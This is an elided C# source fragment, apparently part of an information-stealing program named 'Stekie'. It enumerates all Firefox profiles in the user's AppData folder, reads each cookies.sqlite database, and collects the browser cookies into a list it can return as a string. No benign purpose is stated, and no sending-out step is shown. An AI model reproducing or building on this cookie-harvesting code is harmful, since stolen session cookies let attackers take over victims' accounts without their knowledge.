...
namespace Stekie
{
    public static class Firefox
    {
        ...
        {
            private static List<Cookie> cookiesList = null;
            private static string profilesPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\Mozilla\Firefox\Profiles";
            ...
            public static string GetString()
            {
                if (cookiesList == null)
                {
                    ...
                    foreach (var profilePath in Directory.GetDirectories(profilesPath))
                    {
                        var cookieFile = Path.Combine(profilePath, "cookies.sqlite");
                        cookiesList.AddRange(Cookies.Get(cookieFile));
                    }
                }
            ...
            public static bool GetBool()
            {
                ...
                return (cookiesList.Count == 0 ? false : true);
            }
